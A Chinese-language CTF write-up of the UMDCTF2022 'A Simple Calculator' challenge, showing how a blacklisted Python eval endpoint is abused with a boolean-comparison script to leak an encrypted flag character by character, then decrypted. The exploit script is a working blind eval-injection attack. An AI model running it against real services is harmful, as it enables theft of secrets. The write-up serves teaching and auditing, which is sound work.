# UMDCTF2022 A Simple Calculator Writeup

## 题目简述

计算器后端把 JSON 字段 `f` 经过字符串黑名单后直接交给 Python `eval`，并把结果强制转换成整数。flag 先经过凯撒式位移存入全局变量 `flag_enc`。虽然直接求值该字符串会因 `int()` 转换失败而返回 0，但布尔比较可以构造逐字符盲注。

## 解题过程

关键代码为：

```python
z(request.json["f"])
val = f"{int(eval(request.json['f']))}"
```

黑名单包含 `import`、`open`、`globals`、`__` 等词，却没有拦截全局变量名 `flag_enc`、索引、`len`、字符串字面量或比较运算。

先发送：

```python
len(flag_enc)
```

`eval` 返回整数长度，可以直接从 `result` 读取。随后对每个位置枚举可打印字符：

```python
import string
import requests

base = "http://challenge"

def oracle(expr):
    response = requests.post(base + "/calc", json={"f": expr})
    return response.json()["result"]

length = int(oracle("len(flag_enc)"))
encrypted = ""

for index in range(length):
    for candidate in string.printable:
        expr = f"flag_enc[{index}]=={candidate!r}"
        if oracle(expr) == "1":
            encrypted += candidate
            break

print(encrypted)
```

比较表达式为真时，`int(True)` 是 1；为假时，`int(False)` 是 0。这样得到服务端加密字符串：

```text
OGXWNZ{q0q_vlon3z0lw3cha_4wno4ffs_q0lem!}
```

加密函数把英文字母向后移动 20 位，数字向后移动 20 后模 10。逆变换对字母减 20，对数字减 20：

```python
def decrypt(text, key=20):
    out = ""
    for char in text:
        if char.isupper():
            out += chr((ord(char) - ord("A") - key) % 26 + ord("A"))
        elif char.islower():
            out += chr((ord(char) - ord("a") - key) % 26 + ord("a"))
        elif char.isdigit():
            out += str((int(char) - key) % 10)
        else:
            out += char
    return out
```

最终得到：

```text
UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0rks!}
```

## 方法总结

字符串黑名单无法给 `eval` 建立安全边界；即使返回值被限制为整数，比较、长度和算术仍能形成一位信息的侧信道。审计此类“受限计算器”时，应分别检查可访问的作用域、允许的表达式语法和输出类型转换，不能只寻找命令执行。
